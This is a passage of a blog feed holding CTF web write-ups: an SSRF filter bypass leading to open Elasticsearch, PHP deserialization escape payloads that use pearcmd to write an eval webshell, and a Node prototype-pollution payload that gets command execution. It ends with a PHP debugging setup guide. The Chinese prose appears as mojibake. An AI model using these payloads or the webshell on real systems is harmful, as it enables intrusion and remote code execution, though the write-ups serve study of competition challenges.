			param.TimeStamp.Format(&quot;2006-01-02 15:04:05&quot;),
			param.Method,
			param.Path,
			param.Request.Proto,
			param.StatusCode,
			param.Latency,
			param.Request.UserAgent(),
			param.ErrorMessage,
		)
	}))
	r.Use(gin.Recovery())

	LoadUrl(r)

	return r
}
</code></pre>
<p>åœ¨getè·¯ç”±ä¸‹ä¼ å‚tï¼Œå¹¶è§£æï¼Œcurlå‘èµ·ä¸€ä¸ªå¯¹è¯</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¡«å…¥ä¸€ä¸ªurlåï¼Œè¯¥ç½‘ç«™å¯ä»¥å®ç°è·¨ç«™è®¿é—®ï¼Œçœ‹ä¸€ä¸‹é‡Œé¢çš„ä¸¤ä¸ªwaf</p>
<pre><code class="language-go">if (u.Scheme != &quot;http&quot; &amp;&amp; u.Scheme != &quot;https&quot;) || IsInternalIp(u.Hostname()) {  //åªæ¥å—httpå’Œhttpsåè®® ipæ£€æµ‹
				c.JSON(http.StatusBadRequest, gin.H{
					&quot;msg&quot;:&quot;illage url&quot;,
				})
				return
</code></pre>
<p>ä»¥åŠ</p>
<pre><code class="language-go">func IsInternalIp(host string) bool {
	ipaddr, err := net.ResolveIPAddr(&quot;ip&quot;, host)  //æ ¹æ®åŸŸåæŸ¥ip

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(ipaddr.IP, ipaddr.Zone)

	if ipaddr.IP.IsLoopback() { // åˆ¤æ–­æ˜¯å¦æ˜¯è¿˜å›åœ°å€
		return true
	}

	ip4 := ipaddr.IP.To4() //è½¬æ¢ä¸ºipv4
	if ip4 == nil {
		return false
	}
	return ip4[0] == 10 ||
		(ip4[0] == 172 &amp;&amp; ip4[1] &gt;= 16 &amp;&amp; ip4[1] &lt;= 31) ||
		(ip4[0] == 169 &amp;&amp; ip4[1] == 254) ||
		(ip4[0] == 192 &amp;&amp; ip4[1] == 168)
}
</code></pre>
<p>å¿…é¡»æ˜¯httpæˆ–è€…httpså¼€å¤´ï¼Œåœ°å€çš„ipä¸èƒ½æ˜¯è¿˜å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯127.0.0.1ï¼Œç„¶åå¯¹æ•´ä¸ªipv4ä¹Ÿåšäº†ä¸€äº›é™åˆ¶</p>
<p>ç”±äºè¿™é‡Œå­˜åœ¨ResolveIPAddr()æ–¹æ³•ï¼Œè¾“å…¥çš„åŸŸåä¼šè¢«è§£æï¼Œæ‰€ä»¥çŸ­ipçš„æ–¹å¼ä¹Ÿéš¾ä»¥ç»•è¿‡ï¼Œåè¿›åˆ¶ç­‰ipè½¬æ¢ä¹Ÿä¼šè¢«è§£ç </p>
<p>ä½†æ˜¯è¿™æ˜¯æœ‰ä¸€ä¸ªç»ä½³æ–¹æ¡ˆ</p>
<pre><code>http://0.0.0.0
</code></pre>
<p>æŒ‡ä»£æœ¬æœºçš„æ‰€æœ‰ipï¼Œè‡ªç„¶ä¹ŸåŒ…æ‹¬127.0.0.1</p>
<p>æˆ‘ä»¬çš„ç›®çš„æ˜¯æ ¹æ®å·²æœ‰æç¤ºå»æ‰“9200ç«¯å£</p>
<pre><code>{
  &quot;name&quot; : &quot;ali-sh-sec-ctf-25aaa86-01&quot;,
  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
  &quot;cluster_uuid&quot; : &quot;ikcj8ysFR2KnnTa5chqvUA&quot;,
  &quot;version&quot; : {
    &quot;number&quot; : &quot;7.17.6&quot;,
    &quot;build_flavor&quot; : &quot;default&quot;,
    &quot;build_type&quot; : &quot;deb&quot;,
    &quot;build_hash&quot; : &quot;f65e9d338dc1d07b642e14a27f338990148ee5b6&quot;,
    &quot;build_date&quot; : &quot;2022-08-23T11:08:48.893373482Z&quot;,
    &quot;build_snapshot&quot; : false,
    &quot;lucene_version&quot; : &quot;8.11.1&quot;,
    &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;,
    &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot;
  },
  &quot;tagline&quot; : &quot;You Know, for Search&quot;
}
</code></pre>
<p>å‘ç°æ˜¯ä¸€ä¸ªelasticsearchçš„æœªæˆæƒè®¿é—®</p>
<p>ç›´æ¥æŸ¥è¯¢æ‰€æœ‰çš„indexå’Œtype</p>
<pre><code>_search?pretty=trueÂ 
</code></pre>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p>
<pre><code>&quot;hits&quot; : {
    &quot;total&quot; : {
      &quot;value&quot; : 1,
      &quot;relation&quot; : &quot;eq&quot;
    },
    &quot;max_score&quot; : 1.0,
    &quot;hits&quot; : [
      {
        &quot;_index&quot; : &quot;bilibili-1024&quot;,
        &quot;_type&quot; : &quot;_doc&quot;,
        &quot;_id&quot; : &quot;2eSE84MBoy7sRgaelu2S&quot;,
        &quot;_score&quot; : 1.0,
        &quot;_source&quot; : {
          &quot;username&quot; : &quot;ctfer&quot;,
          &quot;passwd&quot; : &quot;1qaz@WSX&quot;,
          &quot;ttl&quot; : &quot;false&quot;,
          &quot;msg&quot; : &quot;good luck ctfer&quot;
        }
      }
</code></pre>
<p>ç™»å…¥JFrogåå°ï¼Œåœ¨åå°ç›´æ¥æœsshï¼Œå°±èƒ½æ‰¾åˆ°è¿æ¥sshçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿æ¥åcat flagå³å¯</p>
<h3 id="å…³äºelasticsearch">å…³äºelasticsearch</h3>
<p><a href="https://blog.51cto.com/feelmanc/1250430">elasticsearchçš„åŸºæœ¬ç”¨æ³•_feelMancçš„æŠ€æœ¯åšå®¢_51CTOåšå®¢</a></p>
<p><a href="https://so.csdn.net/so/search?q=Elasticsearch&amp;spm=1001.2101.3001.7020">Elasticsearch</a>æ˜¯ä¸€æ¬¾javaç¼–å†™çš„ä¼ä¸šçº§æœç´¢æœåŠ¡ã€‚è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä½¿ç”¨ELKä½œä¸ºæ—¥å¿—åˆ†æï¼Œå¯åŠ¨æ­¤æœåŠ¡é»˜è®¤ä¼šå¼€æ”¾9200ç«¯å£æˆ–è€…9300ç«¯å£ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ®</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[è®°ä¸¤é“å¼ºç½‘æ‹Ÿæ€çš„web]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/ji-liang-dao-qiang-wang-ni-tai-de-web/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/ji-liang-dao-qiang-wang-ni-tai-de-web/">
        </link>
        <updated>2022-11-08T06:27:08.000Z</updated>
        <summary type="html"><![CDATA[<p>æ²¡èƒ½æŒºè¿›å†³èµ›ï¼Œä½†æ˜¯ç¨³ç¨³è‹Ÿä½äº†å‰60ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ğŸ¤£</p>
]]></summary>
        <content type="html"><![CDATA[<p>æ²¡èƒ½æŒºè¿›å†³èµ›ï¼Œä½†æ˜¯ç¨³ç¨³è‹Ÿä½äº†å‰60ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ğŸ¤£</p>
<!-- more -->
<h2 id="ezus">ezus</h2>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°è¿™ä¸€æ®µæºç </p>
<pre><code class="language-php">&lt;?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
{
    exit(&quot;no way!&quot;);
}
if (isset($_GET['source']))
{
    $path = basename($_SERVER['PHP_SELF']);
    if (!preg_match('/tm.php$/', $path) &amp;&amp; !preg_match('/index.php$/', $path))
    {
        exit(&quot;nonono!&quot;);
    }
    highlight_file($path);
    exit();
}
?&gt;
&lt;a href=&quot;index.php?source&quot;&gt;source&lt;/a&gt;
</code></pre>
<p>ç›´æ¥ç»•è¿‡å°±è¡Œ</p>
<pre><code>http://172.52.4.193/index.php/tm.php/ï¿½?source
</code></pre>
<p>å¾—åˆ°tm.phpæºç </p>
<pre><code class="language-php">&lt;?php
class UserAccount
{
    protected $username;
    protected $password;
 
    public function __construct($username, $password)
    {
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}
 
function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}
 
function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;
    
    public function __construct($hint, $f)
    {
        $this-&gt;f = $f;
        $this-&gt;hint = $hint;
    }
    
    public function __wakeup()
    {
        //something in hint.php
        if ($this-&gt;hint != &quot;pass&quot; || $this-&gt;f != &quot;pass&quot;) {
            $this-&gt;hint = &quot;pass&quot;;
            $this-&gt;f = &quot;pass&quot;;
        }
    }
    
    public function __destruct()
    {
        if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this-&gt;hint);
            if (!empty($this-&gt;f)) {
                if (strpos($this-&gt;f, &quot;try&quot;) !==  false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) {
                    @include($this-&gt;f . '.php');
                } else {
                    die(&quot;try again!&quot;);
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this-&gt;hint);
                    echo &quot;&lt;br/&gt;&quot;.$out;
                } else {
                    die(&quot;&lt;br/&gt;error&quot;);
                }
            } else {
                die(&quot;try it!&quot;);
            }
        }
        else
        {
            echo &quot;Invalid URL&quot;;
        }
    }
}

$username = $_POST['username'];
$password = $_POST['password'];

$user = serialize(new UserAccount($username, $password));
unserialize(object_weakup(object_sleep($user)))
?&gt; 
</code></pre>
<p>å­˜åœ¨ååºåˆ—åŒ–çš„é€ƒé€¸ï¼Œç›®çš„æ˜¯ç”¨UserAccountç±»å»è§¦å‘orderç±»ï¼Œä¹Ÿå°±æ˜¯é€ƒé€¸åŒå¼•å·ï¼Œ<br>
è®©password=new order()</p>
<p>payloadï¼š</p>
<pre><code>username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Ftrypass%2Fread%3Dconvert.base64-encode%2Fresource%3Dhint%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>è¯»ä¸€ä¸‹hint.php</p>
<pre><code class="language-php">&lt;?php
echo &quot;This is the wrong way&quot;;
$flag = &quot;you can find it in /f1111444449999.txt&quot;;
?&gt;
</code></pre>
<p>å°è¯•ä¸€ä¸‹pearcmdï¼Œå‘ç°è¿˜çœŸæœ‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å†™é©¬äº†</p>
<p>payloadï¼š</p>
<pre><code>POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[1])?&gt;+3.php

username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A60%3A%22trypass%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>getshellåè¯»flag</p>
<pre><code>(www-data:/var/www/html) $ cat /f1111444449999.txt
flag{sMGbQqN7RTQwS6L0j9f5nytW1wWBAkWJ}
</code></pre>
<h2 id="whoyouare">WHOYOUARE</h2>
<p>é¢˜ç›®é‡‡ç”¨äº†fastifyæ¡†æ¶ï¼Œä¸»è¦çš„ä»£ç åœ¨user.jsä¸­</p>
<pre><code class="language-javascript">const merge = require('../utils/merge')
const bin = &quot;/bin/bash&quot;
const ChildProcess = require('child_process');

function checkUser(command){
    if (Array.isArray(command) === false || command.length &gt; 2) {  //æ•°ç»„ä¸”é•¿åº¦å°äºç­‰äº2
        return false;
    }
    for (let i = 0; i &lt; command.length; i++) {
        let cmd = command[i];
        if (typeof cmd !== 'string' || cmd.length &gt; 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) { //å°äºç­‰äº4çš„å­—ç¬¦ä¸²
            return false;
        }
    }
    return true;
}

async function routes (fastify, options) {
    fastify.route(
        {
            method: 'POST',
            url: '/user',
            schema: {
                querystring: {
                    user: { type: 'string' },
                },
                additionalProperties: false,
                response: {
                    200: {
                        $ref: 'respWrapper#/response/success'
                    }
                }
            },
            preHandler: function (request, reply, done) {
                //user init
                request.user = {username : 'guest', command: [&quot;-c&quot;, &quot;id&quot;]}  //æ±¡æŸ“çš„ç›®æ ‡
                let user = JSON.parse(request.body.user)  //jsoné‡Œçš„user
                // clean user command
                if (checkUser(user.command) !== true) {   //cmdéœ€è¦æ»¡è¶³æ¡ä»¶
                    user.command = [&quot;-c&quot;, &quot;id&quot;]
                }
                try {
                    merge(request.user, user)
                }catch (e){
                    reply.code(400).send({status: 1, info: &quot;Something error&quot;})
                    return ;
                }
                done()
            },
            handler : function (request, reply) {
                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) =&gt; {   //å‘½ä»¤æ‰§è¡Œ
                    if (error) {
                        reply.code(400).send({status: 1, info: error})
                    }
                    reply.code(200).send({ status : 0 , info : `User of ${request.user.username} : ${stdout}`});
                });
            }
        })
    fastify.route({
        method: 'GET',
        url: '/',
        response: {
            $ref: 'respWrapper#/response/success'
        },
        handler: function (request, reply) {
            reply.send({ status: 0, info: 'go user' })
        }
    })
}

module.exports = routes
</code></pre>
<p>é¦–å…ˆæ˜¯ä¸¤ä¸ªè·¯ç”±ï¼ŒGETè®¿é—®åˆ™ä¼šæç¤ºæˆ‘ä»¬å»è®¿é—®user</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯POSTè®¿é—®/userï¼Œå¯ä»¥çœ‹åˆ°å®ƒä¼šæ¥å—jsonæ•°æ®ï¼Œä½†æˆ‘ä»¬å‘ç°åªæœ‰requset.userä¸­çš„cmdæ‰ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æƒ³åŠæ³•æ±¡æŸ“request.userå¯¹è±¡ï¼Œæˆ‘ä»¬å¯æ§çš„æ˜¯userå¯¹è±¡ï¼Œä»¥åŠé‡Œé¢çš„commandå±æ€§</p>
<p>ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡è¿˜æœ‰ä¸€ä¸ªmergeå‡½æ•°ç›¸è¿ï¼Œè¿™å°±ä¸ºåŸå‹é“¾æ±¡æŸ“åˆ›é€ äº†æœºä¼š</p>
<pre><code>{&quot;user&quot;:{&quot;__proto__&quot;:{&quot;command&quot;:[&quot;-c&quot;, &quot;cat /flag&quot;]}}}
</code></pre>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888886359.png" alt="" loading="lazy"><br>
ä½†æ˜¯éå¸¸é—æ†¾çš„æ˜¯<code>__proto___</code>è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯constructorä»¥åŠprototypeéƒ½æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç”±äºmergeçš„é€’å½’åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨constructor.prototypeå»æŒ‡å‘userçš„åŸå‹</p>
<pre><code>{&quot;user&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;1&quot;,&quot;cat /flag&quot;}ï¼Œ&quot;command&quot;:[&quot;-c&quot;],}}}
</code></pre>
<p>è¿™ä¸ªjsonè¢«é€’å½’åï¼ŒObjectå¯¹è±¡ä¸­ä¼šè¢«å†™å…¥å±æ€§</p>
<pre><code>&quot;1&quot;:&quot;cat /flag&quot;
</code></pre>
<p>åœ¨åˆå¹¶commandå±æ€§æ—¶ï¼Œç”±äºuserä¸­çš„commandæ•°ç»„åªæœ‰ä¸€ä¸ªå€¼ï¼Œè€Œrequest.userä¸­çš„commandæ•°ç»„æœ‰ä¸¤ä¸ªå€¼ï¼Œæ‰€ä»¥é€’å½’è¿‡ç¨‹ä¸­ä¼šå‡ºç°(sourceæ˜¯userï¼Œtargetæ˜¯request.user)</p>
<pre><code class="language-javascript">const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const merge = (target, source) =&gt; {
    for (const key in source) {
        if(!whileTypes.includes(typeof source[key]) &amp;&amp; !whileTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                merge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}
</code></pre>
<p>source[1]ä¸å­˜åœ¨è€Œtarget[1]=idï¼Œäºæ˜¯ä¹å°±ä¼šè‡ªåŠ¨ä»åŸå‹ä¸­å¯»æ‰¾æ˜¯å¦æœ‰åˆé€‚çš„å€¼ï¼Œå¯¹äºæ•°ç»„æ¥è¯´ï¼Œ</p>
<p><code>&quot;1&quot;:&quot;cat /flag&quot;</code>å°±æ˜¯array[1]=&quot;cat /flag&quot;</p>
<p>äºæ˜¯sourceå°±ä»å®ƒçš„åŸå‹ä¸­ç»§æ‰¿äº†è¿™ä¸ªé”®å€¼å¯¹ï¼Œ</p>
<p>ç„¶åtarget[key] = source[key] å°±æŠŠidç¯¡æ”¹æˆäº†cat /flag</p>
<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888849256.png" alt="" loading="lazy"></figure>
<p>final payloadï¼š</p>
<pre><code>{&quot;user&quot;:\&quot;constructor\&quot;:{\&quot;prototype\&quot;: {\&quot;1\&quot;: \&quot;cat /flag\&quot;,&quot;{\&quot;command\&quot;:[\&quot;-c\&quot;]}}}&quot;}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vscode+phpstudyåŠ¨æ€è°ƒè¯•ç¯å¢ƒ]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/">
        </link>
        <updated>2022-10-19T08:56:37.000Z</updated>
        <summary type="html"><![CDATA[<p>å°ç™½çš„cnvdä¹‹æ—…ï¼ˆä¸€ï¼‰ï¼šæ­å»ºç¯å¢ƒ</p>
]]></summary>
        <content type="html"><![CDATA[<p>å°ç™½çš„cnvdä¹‹æ—…ï¼ˆä¸€ï¼‰ï¼šæ­å»ºç¯å¢ƒ</p>
<!-- more -->
<h2 id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</h2>
<p>phpstudyï¼ˆç›´æ¥å®˜ç½‘ä¸‹è½½å°±å¯ä»¥ï¼‰<br>
<a href="https://www.xp.cn/download.html">Windowsç‰ˆphpstudyä¸‹è½½ - å°çš®é¢æ¿(phpstudy) (xp.cn)</a><br>
vscodeï¼ˆåŒæ ·å®˜ç½‘ç›´æ¥ä¸‹ï¼‰<br>
https://code.visualstudio.com/</p>
<h2 id="æ­å»º">æ­å»º</h2>
<h4 id="ç¬¬ä¸€æ­¥">ç¬¬ä¸€æ­¥</h4>
<p>æ‰“å¼€vscodeï¼Œå…ˆå®‰è£…ä¸€ä¸‹ä¸€äº›å¿…è¦çš„æ’ä»¶<br>
1.PHP Debug<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169822931.png" alt="" loading="lazy"><br>
2.æ±‰åŒ–åŒ…<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169831114.png" alt="" loading="lazy"><br>
3.Code Runner<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169834739.png" alt="" loading="lazy"></p>
<h4 id="ç¬¬äºŒæ­¥">ç¬¬äºŒæ­¥</h4>
<p>å®‰è£…å¥½åæ‰“å¼€phpstudyï¼Œæ‰¾åˆ°phpæ‰€åœ¨çš„è·¯å¾„<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169847282.png" alt="" loading="lazy"><br>
å°†è·¯å¾„å¤åˆ¶ï¼Œå†™åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ä¸­ï¼Œå…·ä½“æ“ä½œï¼š<br>
æ‰“å¼€é«˜çº§ç³»ç»Ÿè®¾ç½®-&gt;ç¯å¢ƒå˜é‡-&gt;Path-&gt;æ–°å»º<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169855325.png" alt="" loading="lazy"><br>
é…å¥½åå¯ä»¥åœ¨cmdä¸­è¾“å…¥</p>
<pre><code>php -v
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1666169870770.png" alt="" loading="lazy"></figure>
<h4 id="ç¬¬ä¸‰æ­¥">ç¬¬ä¸‰æ­¥</h4>
<p>ä¸‹è½½xdebug<br>
å…ˆæ–°å»ºä¸€ä¸ªindex.php,å¾—åˆ°phpinfoçš„å†…å®¹<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169909555.png" alt="" loading="lazy"><br>
ç„¶åå»https://xdebug.org/wizardï¼ŒæŠŠphpinfoä¸­çš„å†…å®¹ç²˜è´´è¿›å»ï¼Œå¯ä»¥å¾—åˆ°é€‚åˆçš„xdebugç‰ˆæœ¬<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666169992678.png" alt="" loading="lazy"><br>
æŒ‰ç…§å®ƒçš„æç¤ºä¸€æ­¥ä¸€æ­¥åšï¼š<br>
å°†ä¸‹è½½å¥½çš„xdebugæ”¾åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½å<br>
ç„¶ååœ¨php.iniçš„æœ€ä¸‹é¢å†™å…¥ç›¸å¯¹åº”çš„é…ç½®ï¼Œå½“ç„¶è¿™å¹¶ä¸æ˜¯å®Œæ•´çš„[Xdebug]é…ç½®<br>
è¿˜æœ‰ä¸€éƒ¨åˆ†åœ¨vscodeçš„PHPdebugä¸­ï¼Œå¦‚æœè£…çš„æ˜¯Xdebug3ï¼Œåˆ™å¤åˆ¶ä¸Šé¢éƒ¨åˆ†ï¼ŒXdebug2åˆ™å¤åˆ¶ä¸‹é¢éƒ¨åˆ†ï¼Œè¿™é‡Œä¸»è¦æ˜¯å› ä¸ºXdebugä»2ç‰ˆæœ¬åˆ°3ç‰ˆæœ¬åšäº†ä¸€äº›æ›¿æ¢<br>
å…·ä½“å‚ç…§https://xdebug.org/docs/upgrade_guide</p>
<p>ä»¥Xdebug3ä¸ºä¾‹ï¼š<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170031758.png" alt="" loading="lazy"></p>
<p>é…ç½®å¥½åä¿å­˜php.iniï¼Œå¹¶é‡å¯phpstudyçš„æœåŠ¡<br>
æ‰“å¼€phpinfoï¼Œæœç´¢Xdebugï¼Œå¦‚æœèƒ½çœ‹åˆ°Xdebugçš„æ ‡å¿—ï¼Œåˆ™è¯´æ˜åˆ°ç›®å‰ä¸ºæ­¢ä¸€åˆ‡é¡ºåˆ©<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170105239.png" alt="" loading="lazy"></p>
<h4 id="ç¬¬å››æ­¥">ç¬¬å››æ­¥</h4>
<p>ç”¨vscodeæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ŒæŒ‰F5è¿›å…¥è°ƒè¯•ï¼Œå®ƒä¼šè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªlaunch.json,è¿™é‡Œé»˜è®¤å³å¯<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170118714.png" alt="" loading="lazy"><br>
ç„¶åä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç”¨æµè§ˆå™¨è®¿é—®ä½ çš„phpæ–‡ä»¶ï¼Œæœ€ç»ˆsuccessã€‚ï¼ˆOhhhhhhhhhh<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170134978.png" alt="" loading="lazy"></p>
<h2 id="è§£å†³æŠ¥é”™">è§£å†³æŠ¥é”™</h2>
<h4 id="é—®é¢˜ä¸€">é—®é¢˜ä¸€</h4>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1666170145850.png" alt="" loading="lazy"><br>
å‡ºç°å¦‚ä¸ŠæŠ¥é”™ï¼Œè¯´æ˜ç¬¬ä¸‰æ­¥ä»php debugä¸­å¤åˆ¶é…ç½®æ‰€å¯¹åº”çš„ç‰ˆæœ¬é”™äº†ï¼Œå¦‚ä¸Šå°±æ˜¯Xdebug3å´å¤åˆ¶äº†Xdebug2çš„é…ç½®</p>
<h4 id="é—®é¢˜äºŒ">é—®é¢˜äºŒ</h4>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1666170155427.png" alt="" loading="lazy"><br>
è¿™ä¸ªé—®é¢˜ä¸»è¦å› ä¸ºXdebug3ä¸­çš„ xdebug.start_with_request = yes å°† Xdebug é…ç½®ä¸ºåœ¨æ¯ä¸ªè¯·æ±‚ä¸Šå»ºç«‹è¿æ¥ï¼ŒåŒæ—¶ï¼Œå®˜æ–¹æ–‡æ¡£æä¾›ä½¿ç”¨ xdebug.start_with_request = trigger ä»¥ä¾¿ä»…åœ¨æ˜ç¡®æŒ‡å‡ºéœ€è¦æ—¶è¿æ¥ Xdebugã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ GET å‚æ•°ä¼ é€’ä¸€ä¸ªé¢å¤–çš„å¯†é’¥æ¥å¼€å§‹é€æ­¥è°ƒè¯•è¿‡ç¨‹ï¼Œä¾‹å¦‚ http://localhost/?XDEBUG_TRIGGER=1ï¼Œä½†å¾ˆä¸æ–¹ä¾¿ã€‚<br>
è§£å†³æ–¹æ³•å°±æ˜¯åœ¨php.iniçš„é…ç½®ä¸­åŠ å…¥</p>
<pre><code>xdebug.discover_client_host = yes
xdebug.log_level = 0
</code></pre>
<h4 id="é—®é¢˜ä¸‰">é—®é¢˜ä¸‰</h4>
<p>ç«¯å£è¢«å ç”¨ï¼Œè¿™ç§æƒ…å†µå»ºè®®åœ¨ä½¿ç”¨è¿™ä¸ªç«¯å£ï¼ˆé»˜è®¤æ˜¯9000-9003ï¼‰ä¹‹å‰å¯ä»¥åœ¨phpstudyä¸­æ£€æŸ¥ä¸€ä¸‹ç«¯å£æ˜¯å¦å·²ç»è¢«å ç”¨<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1666170170363.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å…¨æ–°çš„å¼€å§‹]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/quan-xin-de-kai-shi/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/quan-xin-de-kai-shi/">
        </link>
        <updated>2022-10-19T00:47:07.000Z</updated>
        <summary type="html"><![CDATA[<p>æœåŠ¡å™¨åˆ°æœŸäº†ï¼Œä¹‹å‰ä¹°çš„åŸŸåä¹Ÿåˆ°æœŸäº†ã€‚ã€‚ã€‚<br>
äºæ˜¯ä¹<br>
å…¨æ–°çš„åŸŸåï¼Œå…¨æ–°çš„åšå®¢ï¼Œåˆæ˜¯ä¸€ä¸ªå…¨æ–°çš„å¼€å§‹<br>
github page + Grideaï¼Œå®Œç¾è§£å†³æœåŠ¡å™¨ç»­è´¹å¦‚å‹’ç´¢çš„å›°æ‰°(ç‹‚å–œ.jpg)</p>
]]></summary>
        <content type="html"><![CDATA[<p>æœåŠ¡å™¨åˆ°æœŸäº†ï¼Œä¹‹å‰ä¹°çš„åŸŸåä¹Ÿåˆ°æœŸäº†ã€‚ã€‚ã€‚<br>
äºæ˜¯ä¹<br>
å…¨æ–°çš„åŸŸåï¼Œå…¨æ–°çš„åšå®¢ï¼Œåˆæ˜¯ä¸€ä¸ªå…¨æ–°çš„å¼€å§‹<br>
github page + Grideaï¼Œå®Œç¾è§£å†³æœåŠ¡å™¨ç»­è´¹å¦‚å‹’ç´¢çš„å›°æ‰°(ç‹‚å–œ.jpg)</p>
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/hello-gridea/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>ğŸ‘  æ¬¢è¿ä½¿ç”¨ <strong>Gridea</strong> ï¼<br>
âœï¸  <strong>Gridea</strong> ä¸€ä¸ªé™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥è®°å½•ä½ çš„ç”Ÿæ´»ã€å¿ƒæƒ…ã€çŸ¥è¯†ã€ç¬”è®°ã€åˆ›æ„... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>ğŸ‘  æ¬¢è¿ä½¿ç”¨ <strong>Gridea</strong> ï¼<br>
âœï¸  <strong>Gridea</strong> ä¸€ä¸ªé™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥è®°å½•ä½ çš„ç”Ÿæ´»ã€å¿ƒæƒ…ã€çŸ¥è¯†ã€ç¬”è®°ã€åˆ›æ„... ...</p>
<!-- more -->
